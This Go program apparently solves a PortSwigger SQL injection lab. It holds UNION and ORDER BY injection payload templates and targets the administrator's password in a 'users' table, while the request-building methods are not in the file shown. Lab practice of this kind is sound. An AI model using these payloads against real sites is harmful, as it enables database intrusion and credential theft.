package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_6/logger"
)

const (
	uriPath                  = "/filter?category=abc"
	payloadToGetNumOfColumns = "'+ORDER+BY+{}--"
	payloadWithUNION         = "'+UNION+SELECT+{}--"
	demoString               = "'abc'"         // Placeholder for string concatenation
	stringPlaceholder        = "{str}"         // Placeholder for column index in payloads
	username                 = "administrator" // Target username to find password for
	dbTableName              = "users"         // Target table
	dbColumnUsername         = "username"      // Target username column
	dbColumnPassword         = "password"      // Target password column
	maxColumnSearch          = 100             // Limit search for columns to prevent excessive requests
)

// Config holds application configuration parsed from command-line flags.
type Config struct {
	LabURL   string
	ProxyURL string
	LogLevel string
}

func main() {
	config, err := parseArgs()
	if err != nil {
		// parseArgs already prints usage info on error
		logger.Fatalf("Exiting due to error in command-line arguments: %w", err.Error())
		os.Exit(1)
	}

	// Set log level based on command-line argument
	logger.SetLogLevelS(config.LogLevel)
	logger.Debugf("Log level set to: %s", config.LogLevel)

	tester, err := newSQLInjectionTester(config)
	if err != nil {
		logger.Fatalf("Failed to initialize tester: %w", err.Error())
	}

	logger.Actionf("Starting SQL injection test against: URL: %s with proxy: %s", config.LabURL, config.ProxyURL)
	// 1. Find the number of columns
	logger.Action("Determining number of columns...")
	numOfColumns, err := tester.findNumOfColumns()
	if err != nil {
		logger.Fatalf("Failed to find number of columns: %w", err.Error())
	}
	logger.Successf("Number of columns found: %d", numOfColumns)

	// 2. Perform UNION attack and extract target user
	logger.Action("Attempting UNION attack to retrieve target user...")
	targetUser, err := tester.GetTargetUser(numOfColumns)
	if err != nil {
		logger.Fatalf("Failed to retrieve target user: %w", err.Error())
	}

	if targetUser != "" {
		logger.Successf("Target user found: %s", targetUser)
		logger.Success("Attack successful!")
	} else {
		// This case should ideally be covered by errors above, but added for completeness
		logger.Fatal("Attack finished, but target user was not found (unexpected state).")
	}
}

// parseArgs parses command-line arguments and returns Config or an error.
func parseArgs() (Config, error) {
	config := Config{}

	flag.StringVar(&config.LabURL, "u", "", "Target URL of the PortSwigger Lab (required)")
	flag.StringVar(&config.ProxyURL, "proxy", "", "Optional proxy URL (e.g., http://127.0.0.1:8080)")
	flag.StringVar(&config.LogLevel, "log-level", "info", "Set log level (debug, info, action, warning, fatal, success)")
	flag.Parse() // Parse flags defined above

	if config.LabURL == "" {
		logger.Warning("Usage: ")
		flag.PrintDefaults() // Print default usage information
		return config, errors.New("missing target URL")
	}

	// Normalize URL after parsing
	config.LabURL = normalizeURL(config.LabURL)

	return config, nil
}

// newSQLInjectionTester creates and initializes the tester.
func newSQLInjectionTester(config Config) (*SQLInjectionTester, error) {
	client, err := newHTTPClient(config.ProxyURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP client: %w", err)
	}

	return &SQLInjectionTester{
		client:    client,
		targetURL: config.LabURL, // Already normalized in parseArgs
	}, nil
}

// newHTTPClient creates an HTTP client, optionally configured with a proxy.
func newHTTPClient(proxyURL string) (*http.Client, error) {
	transport := &http.Transport{}

	if proxyURL != "" {
		parsedProxyURL, err := url.Parse(proxyURL)
		if err != nil {
			// Return error instead of exiting
			logger.Warningf("Invalid proxy URL: %s, error: %s", proxyURL, err.Error())
		} else {
			// Set the proxy URL in the transport
			logger.Debugf("Setting up proxy transport with URL: %s", parsedProxyURL.String())
			transport.Proxy = http.ProxyURL(parsedProxyURL)
		}
	}

	return &http.Client{Transport: transport}, nil
}

// normalizeURL ensures the URL has a scheme and no trailing slash.
func normalizeURL(rawURL string) string {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = "https://" + rawURL // Default to https for labs
	}

	// Remove trailing slash if present
	url := strings.TrimSuffix(rawURL, "/")
	logger.Debugf("Raw URL: %s", rawURL)

	return url
}

// safeClose attempts to close an io.Closer and logs any error.
func safeClose(closer io.Closer) {
	if closer == nil {
		return
	}
	if err := closer.Close(); err != nil {
		logger.Fatalf("Error closing resource: %s", err.Error())
	}
}
